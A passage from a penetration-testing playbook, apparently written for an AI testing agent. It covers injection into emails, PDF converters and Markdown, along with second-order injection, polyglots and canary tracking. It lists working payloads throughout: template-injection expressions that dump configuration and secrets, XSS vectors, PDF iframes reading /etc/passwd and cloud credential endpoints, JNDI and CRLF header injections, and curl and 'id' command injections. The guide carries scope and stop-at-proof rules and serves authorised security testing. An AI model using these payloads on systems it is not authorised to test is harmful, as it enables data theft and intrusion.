${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{self.__init__.__globals__}}
${.data_model}
{{ user.password }}
{{ recipient.email }}
{{ 'x'.constructor.constructor('return process.env')() }}
```
Also test, in the same fields:
```
<img src=x onerror=alert(1)>                  HTML email rendering / in-app preview -> 3.16
<img src="http://CANARY.oast.fun/?f=name">    tracking-pixel style confirm that HTML is honoured
<a href="javascript:alert(1)">x</a>
%0aBcc:%20canary@CANARY.oast.fun              header injection -> 3.12
${jndi:ldap://email.CANARY.oast.fun/x}        the mailer logs it -> 3.18
=HYPERLINK("http://CANARY/","x")              if the email content also feeds an export -> 3.17
```
The SSTI here is often high impact because mail templates run with access to the whole context object —
`{{user}}` may dump another user's record, and `{{config}}` may dump SMTP credentials.

RISK: only send mail to your own addresses. Do not inject `Bcc:` with a third party (3.12).

**PDF generation / HTML→PDF.** If your input reaches the HTML that the converter renders, you get SSRF and
often local file read, because the converter is a browser with file access.
```html
<iframe src="file:///etc/passwd" width=1000 height=1000></iframe>
<iframe src="file:///c:/windows/win.ini"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<iframe src="http://127.0.0.1:8080/"></iframe>
<img src="http://CANARY.oast.fun/?f=invoice_name">
<link rel=stylesheet href="file:///etc/passwd">
<link rel=attachment href="file:///etc/passwd">
<object data="file:///etc/passwd"></object>
<embed src="file:///etc/passwd">
<base href="file:///etc/">
<portal src="file:///etc/passwd"></portal>
<script>document.write(1+1)</script>
<script>x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();document.write(x.responseText)</script>
<script>fetch('/api/me').then(r=>r.text()).then(t=>document.write(t))</script>
<script>location='file:///etc/passwd'</script>
<style>@import url("file:///etc/passwd");</style>
<meta http-equiv="refresh" content="0;url=file:///etc/passwd">
<annotation file="/etc/passwd" content="x" icon="Graph" title="x" pos-x="195"/>   (wkhtmltopdf/pdfkit)
```
`wkhtmltopdf` honours `<iframe>`, `<img>`, `<link>`, and JS. Headless Chrome usually blocks `file://` from
an `http://` page but allows same-origin `fetch` — which means the PDF can contain the response to an
authenticated internal API call. That is the highest-value variant: `fetch('/api/admin/users')` rendered
into a PDF you download.

Engine-specific:
```
dompdf   <link rel=stylesheet href="php://filter/convert.base64-encode/resource=../config.php">
dompdf   font-family injection -> writes a .php font cache file  (RISK: file write, do not)
mPDF     <annotation file="/etc/passwd" ...>
TCPDF    <tcpdf method="..." params="...">   RISK: method call, ask operator first
weasyprint  <link rel=attachment href="file:///etc/passwd">
LibreOffice  formula/DDE in the source doc -> 3.17
Prince   <img src="file:///etc/passwd">
```
Also test SVG-in-PDF (the SVG is parsed by a separate library → 3.6) and the PDF metadata fields
(title/author from user input, which can carry `\` escapes that break the PDF object structure).

**Markdown / BBCode.**
```
[click](javascript:alert(1))
[click](javascript&colon;alert(1))
[click](java%0ascript:alert(1))
[click](JaVaScRiPt:alert(1))
[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
[click](vbscript:alert(1))
![img](http://CANARY.oast.fun/?f=comment)
![img](x"onerror="alert(1))
![img](x onerror=alert(1))
[ref]: javascript:alert(1)
[click][ref]
<img src=x onerror=alert(1)>
<https://x" onmouseover="alert(1)>
`<img src=x onerror=alert(1)>`
[click](#" onclick="alert(1))
[a](b "title\" onmouseover=\"alert(1)")
[a]: /x 'title" onmouseover="alert(1)'
<!-- --><img src=x onerror=alert(1)><!-- -->
```
```
[url=javascript:alert(1)]x[/url]
[img]http://CANARY.oast.fun/?f=bbcode[/img]
[img]x" onerror="alert(1)[/img]
[color=red" onmouseover="alert(1)]x[/color]
[email]x" onmouseover="alert(1)[/email]
[code]<img src=x onerror=alert(1)>[/code]
[size=1" onload="alert(1)]x[/size]
```
Markdown renderers that allow raw HTML with a sanitizer pass afterwards are the mXSS target — go to 3.16's
mutation list. Markdown that gets rendered to *PDF* or *email* uses a different pipeline than the web view;
test all three render sites (3.21).

**Confirm.**
1. Open the artifact itself — the received email's raw source, the downloaded PDF's text layer
   (`pdftotext out.pdf -`), the rendered comment's DOM.
2. `49` in the artifact, or the file content in the PDF, or a canary hit from the converter's egress IP.
3. Control: the same field with a benign value produces a clean artifact.
4. Save the artifact in `evidence/`.

**Escalate — stop at proof.** Expression evaluation or file read in the artifact → one internal URL or one
`/etc/passwd` → for PDF-SSRF, one authenticated same-origin API response rendered into the PDF (redact its
content in the report if it is real user data, and stop reading). Do not use the converter to scan (3.11
ROE) and do not write files via the dompdf font cache.

**Commonly missed.**
- The whole card. Testers check the web page, see escaping, and mark the row negative. The PDF of the same
  data has none.
- `pdftotext` on the downloaded PDF. A file read renders as text you cannot see in a thumbnail.
- The email's raw source, not the rendered preview.
- Different engines per artifact: web view = React (escaped), email = Handlebars (raw), PDF = wkhtmltopdf
  (browser with file access). Three sinks, one input.
- Markdown link `javascript:` — filtered in most renderers now, but `java%0ascript:` and `&colon;` often are not.
- Reference-style markdown links and title attributes, which skip the URL sanitiser in several libraries.
- PDF metadata fields.

---

## 3.21 Second-order and stored injection

**What it is.** The payload is stored clean and fires later, somewhere else, in a different renderer. Not a
sink type of its own — a delivery pattern for every card above.

**Where it hides.** `../CLAUDE.md` rule 7 turned into a procedure: any field that is stored and rendered
again. Profile fields, org and company names, ticket titles and bodies, comments, review text, filenames,
coupon codes, custom-field labels, webhook URLs, API key names, address lines, and every header the app
persists (`User-Agent`, `X-Forwarded-For`, `Referer`).

**Detect — the render-site checklist.** After any POST/PUT/PATCH that stores data, visit all of these
before you mark any related row `tested-negative`:

| # | Render site | How to reach it |
|---|---|---|
| 1 | The HTML page that shows the record | the obvious one |
| 2 | The list/table/search-results view | different template, often unescaped |
| 3 | The edit form (value in an `value=` attribute) | attribute context, 3.16 |
| 4 | CSV export | 3.17 |
| 5 | XLSX export | 3.17 + 3.6 (OOXML) |
| 6 | PDF export / invoice / report | 3.20 |
| 7 | Email (notification, digest, receipt, admin alert) | 3.20, 3.12 |
| 8 | Log file and the in-app log viewer | 3.18, 3.16 |
| 9 | Admin panel view of the same record | blind XSS territory, 3.16 |
| 10 | Webhook payload sent to a third-party URL you control | register your own webhook, read the body |
| 11 | Mobile / public API response (`/api/v1/...`, different serializer) | JSON escaping differs |
| 12 | Search index (Elasticsearch) and the search-results snippet | 3.2 |
| 13 | Cache / CDN copy of any of the above | 3.13 |
| 14 | Background job output (thumbnail, transcode, virus scan) | 3.3, OOB only |
| 15 | Sitemap, RSS/Atom feed, OpenGraph tags, `oEmbed` | 3.16, 3.6 |
| 16 | Slack/Teams/Discord integration message | third-party render, note ROE |
| 17 | Another tenant's view, if the field is shared (org name, shared doc) | |
| 18 | The 404/error page if the record is deleted | |

Practical loop:
1. Store one canary-tagged payload per (field, sink type).
2. Walk sites 1-18. Note which ones you *cannot* reach (no admin account, no webhook) — those rows stay
   `untested`, not negative (`../CLAUDE.md` 6.6 and 6.8).
3. Leave the OOB listener running for at least 24h. Digests, nightly reports, and batch jobs fire late.
4. Re-walk after any state change (record approved, order shipped, user verified) — new templates render.

**Canary tagging.** A hit is worthless if you cannot say which input produced it. Build the marker into the
payload itself, per (vector, payload). Examples, all of which survive storage and are greppable:
```
XSS      <script src=//c7f2.CANARY.oast.fun/?v=profile.lastname></script>
XSS      <img src=x onerror="fetch('//c7f2.CANARY.oast.fun/?v=profile.lastname')">
SSTI     {{7*7}}/*c7f2:profile.lastname*/
SSTI     ${7*7}<!--c7f2:ticket.subject-->
SQLi     ' AND 1=1-- c7f2:orders.sort
Cmd      ;curl http://c7f2-filename.CANARY.oast.fun/
JNDI     ${jndi:ldap://c7f2-useragent.CANARY.oast.fun/x}
SSRF     http://c7f2-webhook.CANARY.oast.fun/
CSV      =HYPERLINK("http://c7f2.CANARY.oast.fun/?v=company_name","x")
XXE      <!ENTITY a SYSTEM "http://c7f2-docx.CANARY.oast.fun/x">
Traversal ../../../tmp/c7f2-upload-filename.txt
```
Keep the map in `targets/<target>/notes.md`:
```
c7f2 | POST /api/profile | field=lastname | payload=<script src=//c7f2.CANARY.oast.fun/?v=profile.lastname>
c7f3 | POST /api/tickets | field=subject  | payload={{7*7}}<!--c7f3-->
```

**Confirm.** The canary maps back to exactly one stored input, and you have both requests saved: the one
that stored the payload and the one that rendered it (or the listener log line, for an OOB fire). A hit whose
marker matches two fields is not confirmed — re-send with distinct markers.

**Escalate — stop at proof.** Follow the card for whichever sink actually fired, with its own stop rule.
Then **remove or neutralise your stored payloads** — a live stored XSS in a production admin panel is your
liability, not the program's. If you cannot remove it (no delete function, no admin access), say exactly
that in the finding and name the record.

**Commonly missed.**
- Not re-crawling at all. This is the biggest single gap between manual testers and agents.
- Sites 4-11 in the table. The web page is escaped; the export, the email, and the admin view are not.
- Sharing one canary across many fields, so a hit is unattributable and you have to redo the whole sweep.
- Turning the listener off after ten minutes. Nightly digests fire at 02:00.
- Marking a row negative because the render site needs an admin account you do not have. That is
  `untested` plus a note.
- Payloads that do not survive storage (truncated at 32 chars, stripped of `<`). Store a *short* payload:
  `<svg onload=fetch('//c7f2.x')>` fits where a long one does not, and `${7*7}` is 6 characters.

---

## 3.22 Polyglots

For breadth on a large ledger: one value that trips several sinks at once. Use them to triage which rows
deserve a real pass, then confirm with the single-sink payload from the relevant card. A polyglot that
fires tells you *something* happened; it does not tell you what, so never report a polyglot hit — go back
and reproduce it minimally.

**Template / expression polyglot** (3.4, 3.5) — covers Jinja2, Twig, Freemarker, Velocity, SpEL, ERB,
Smarty, Razor, Handlebars in one value:
```
${{<%[%'"}}%\.
${7*7}#{7*7}{{7*7}}<%=7*7%>@(7*7)%{7*7}[[${7*7}]]{7*7}
```

**XSS context polyglot** (3.16) — breaks out of HTML text, single/double-quoted attributes, JS string, JS
template literal, and a comment:
```
'"`><\x3Csvg onload=alert(document.domain)>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><img src=x onerror=alert(document.domain)>${alert(1)}{{constructor.constructor('alert(1)')()}}
</script><svg onload=alert(document.domain)>//`;alert(1)//
```

**SQL / NoSQL / generic-syntax polyglot** (3.1, 3.2, 3.9) — produces an error or a diff in most quote-based
sinks:
```
'"`)}{;--/**/#|&
1'"\)) OR 1=1-- -
' OR 1=1 -- - /*!50000UNION*/
'"><!--
```
Use the boolean-pair versions from 3.1 to confirm; this one is a *noise* probe.

**Command + template + SQL polyglot** (3.3, 3.4, 3.1) — wide net, high false-positive rate:
```
';${7*7}`id`$(id)|id&&id#'"\
"&&id;${7*7}#
```
RISK: this can execute `id` **and** break a query **and** render a template in the same request. Use it
only for triage on non-production-critical fields, never on anything that writes.

**Path / SSRF polyglot** (3.10, 3.11):
```
http://CANARY.oast.fun/../../../etc/passwd
file:///etc/passwd#http://CANARY.oast.fun/
../../../../etc/passwd%00http://CANARY.oast.fun/
```

**CRLF + header + log polyglot** (3.12, 3.18):
```
%0d%0aX-Canary:c7f2%0d%0a${jndi:ldap://c7f2-crlf.CANARY.oast.fun/x}
```

**Filename polyglot** (3.3 argument injection, 3.10 traversal, 3.16 XSS, 3.17 CSV, 3.4 SSTI) — as the
multipart `filename=`:
```
--help$(id)`id`;id|id_../../../tmp/c7f2.txt_<svg onload=alert(1)>_{{7*7}}_=1+1.jpg
```
Send the pieces separately too — a single filename this ugly is often rejected wholesale by a validator,
which tells you nothing.

**The all-purpose canary probe.** Not an attack; send this first on every field to learn what survives:
```
c7f2'"`<>&;|${{}}%0d%0a\/()[]#@=+-
```
Read the raw response and note exactly which characters came back intact, which were encoded, and which
were stripped. That one request decides which payload family is worth sending, and it is the cheapest
thing in this file.

**Rules for polyglots.**
- One per field, then read the *raw* response. Never chain two polyglots in one request.
- A polyglot never goes in a report. Reproduce minimally, then report the minimal payload.
- They inflate false positives. A 500 from a polyglot is `suspicious` (`../CLAUDE.md` 6.6), not confirmed.
- Do not polyglot a field that writes to a shared resource, sends mail, or triggers a job with side
  effects until you know which part fired.

---

## 3.23 Canary discipline

A callback a day later is only useful if you can say which request caused it. Build that in from the start.

**The rule.** One unique marker per **(vector, sink type, payload)** triple. Never reuse a marker across
two fields.

**Marker construction.** Short, greppable, DNS-safe, and self-describing:
```
<4 hex>-<vector>-<sink>
c7f2-uahdr-jndi
a91e-profile.lastname-xss
5b30-upload.filename-cmd
e004-orders.sort-sqli
```
DNS-safe means: lowercase, `a-z0-9-`, each label under 64 chars, total under 253. No underscores in a
hostname label (some resolvers drop them). Put the marker in the **leftmost label** so it survives a
wildcard collector:
```
c7f2-uahdr-jndi.CANARY.oast.fun
```
For HTTP callbacks, the path or query is easier to read and has no length limit:
```
http://CANARY.oast.fun/c7f2/uahdr/jndi
http://CANARY.oast.fun/?m=c7f2&v=uahdr&s=jndi
```
Use both when you can — the DNS label proves resolution even if egress blocks the HTTP request.

**The map.** Keep it in `targets/<target>/notes.md`, appended as you go, never reconstructed afterwards:
```
marker | when                | request                         | field        | sink  | payload
c7f2   | 2024-01-08T11:02:31Z| POST /api/profile               | lastname     | xss   | <script src=//c7f2-profile-lastname.CANARY.oast.fun></script>
e004   | 2024-01-08T11:04:10Z| GET /api/orders?sort=X           | sort         | sqli  | ' AND 1=1-- e004
5b30   | 2024-01-08T11:09:44Z| POST /api/upload (filename)     | filename     | cmd   | ;curl http://5b30-upload-filename.CANARY.oast.fun/
```
Record the timestamp of the *sending* request. A callback timestamp minus the send timestamp tells you
whether the sink is synchronous (sub-second) or a batch job (minutes to hours) — which itself is evidence
for the report and tells you which render site to look at (3.21).

**Listener discipline.**
- Start `interactsh-client` before the sweep, not after you get a suspicious response. See
  `03-bypass-and-blind.md` for setup and for the DNS/HTTP/SMTP/LDAP channel matrix.
- Keep it running for at least 24h after the last stored payload. Log the output to a file — do not rely
  on scrollback.
- Log the callback source IP. It should be the target's egress. A hit from your own IP means your browser
  fired it, not the server.
- Note DNS-only vs DNS+HTTP per hit. DNS-only = resolved but connection blocked (still a finding on many
  programs, and the basis for a bypass in `03-bypass-and-blind.md`).

**Controls.** Every canary hit needs a negative control before you call it confirmed:
- Send the same request with a *different, never-used* marker and no payload structure — no hit expected.
- Send the payload with a marker pointing at a subdomain you never registered — no hit expected.
- If a hit arrives for a marker you never sent, someone else's scan or a shared collector is polluting your
  results. Use a dedicated collector per engagement.

**Canaries for non-network sinks.** Not every confirmation is a callback. Use a distinctive literal string
you can grep for, and record it in the same map:
```
value marker      CANARY7f2A                grep the HTML, the CSV, the PDF text layer, the email source
arithmetic marker {{7*7}}<!--c7f2-->        49 plus the comment tells you which field
length marker     AAAA...x200 + c7f2        find truncation and where the value lands
timing marker     SLEEP(3) on one field only at a time, so a delay is attributable
```
`pdftotext out.pdf - | grep -i canary7f2a` and `grep -ri canary7f2a` over saved responses turn the whole
evidence directory into a search index for your own payloads.

**Why this is non-negotiable.** Second-order injection (3.21), blind XSS (3.16), blind SSRF (3.11),
deserialization (3.7), and log4shell-class bugs (3.18) all produce evidence that arrives detached from the
request that caused it. Without a per-vector marker you get a hit you cannot reproduce, which is not a
finding — `../CLAUDE.md` 3 says never call something confirmed without the request and response saved, and
`../CLAUDE.md` 6.9 says no finding without a reproducible request. A canary map is how you keep both.
